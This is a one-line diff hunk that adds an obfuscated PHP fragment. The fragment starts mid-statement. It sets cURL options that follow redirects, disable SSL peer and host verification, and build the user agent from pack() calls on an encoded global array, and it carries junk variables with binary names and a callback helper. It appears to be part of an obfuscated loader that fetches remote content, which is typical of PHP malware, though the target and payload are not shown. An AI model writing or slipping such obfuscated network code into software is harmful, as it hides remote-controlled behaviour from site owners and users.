@@ -1,0 +1,1 @@
+1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_USERAGENT=>call_user_func_array("pack",array($GLOBALS[AAA____A_][15-5+7-17],$GLOBALS[AAA____A_][11])),CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0]);unset($���ޔ��);$���ޔ��;}))));function tap($CDu5R46,$FBl18S1){$FBl18S1($CDu5R46);unset($��);$��;return $CDu5R46;unset($։��ᬉ�߆);$։��ᬉ�߆;} ?>
